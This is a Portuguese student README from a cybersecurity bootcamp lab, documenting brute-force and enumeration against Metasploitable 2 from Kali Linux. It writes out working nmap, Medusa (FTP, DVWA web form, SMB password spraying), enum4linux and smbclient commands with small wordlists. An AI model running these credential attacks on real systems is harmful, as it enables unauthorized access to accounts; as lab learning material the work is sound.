# bootcamp_dio_ciberseguranca
Aprendizagem e técnicas de força bruta utilizando Kali Linux e Metasploitable

Este projeto tem como foco, explorar técnicas de brute force utilizando ferramentas disponíveis no Kali Linux contra serviços vulneráveis no Metasploitable.

Ferramentas utilizadas:

- Kali Linux (como máquina atacante)
- Metasploitable 2 (como máquina alvo)
- Medusa (que possui suporte a vários protocolos / múltiplas threads)
- Nmap (para escaneamento de portas e identificação de serviços 

Primeiramente foi configurado o ambiente (lab) com as VMs:

- Kali Linux
- Metasploitable 2

E que estejam na mesma rede (host-only)

- Testei a conectividade com a informação do IP alvo usando o ping

Usei alguns comandos aprendidos:

ip a
ping -c 3 (ip_alvo)
nmap -sV -p 21,22,80,445,139 (ip_alvo)
ftp (ip_alvo)

- Criai users e passwords (Wordlists) - exemplos em aula abaixo:

echo -e "user\nmsfadmin\nadmin\nroot">users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin">pass.txt

- Utilizei depois:

medusa -h (ip_alvo) -U users.txt -P pass.txt -M ftp -t 6 (Esse "6" são threads simultâneas para ser mais rápido)

- Depois do sucesso, testar:

ftp (ip_alvo)
(senhas e usuários achados - assim entramos no prompt do FTP)

================================================

## EM FORMULÁRIO DE LOGIN EM SISTEMAS WEB ##

- No navegador web: (ip_alvo)/dvwa/login.php > abrir barra de navegação (desenvolvedor)
- Em "network" vemos o que está sendo enviado e recebido (post > request)

medusa -h (ip_alvo) -U users.txt -P pass.txt
-M http \
-m PAGE:'/dvwa/Login.php'\
-m FORM:'username=ˆUSERˆ&password=ˆPASSˆ&Login=Login'\
-m 'FAIL=Login failed' -t 6 
(para achar as credenciais com as mesmas listas)


================================================

## ATAQUES DE ENUMERAÇÃO ##

Serviçoes SMB - Server Message Block
Protocolo de rede usado principalmente para compartilhamento de arquivos, impressoras e comunicação entre dispositivos em redes locais (LAN)

-enum4linux -a (ip_alvo) | tee enum4_output.txt  (gravar a saída do comando em um arquivo)

Pra ler:
less enum4_output_auth.txt

** Criar Wordlist 

echo -e "user\nmsfadmin\nservice">smb_users.txt (usuários)

echo -e "password\n123456\nWelcome123\nmsfadmin">senhas_spray.txt  (senhas)



> Poucas senhas em muitos usuários = spray
> Muitas senhas em um usuário = brute force

medusa -h (ip_alvo) -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

-Depois de achar, verificar se realmente teremos acesso como administrador.

smbclient -L //(ip_alvo) -U msfadmin
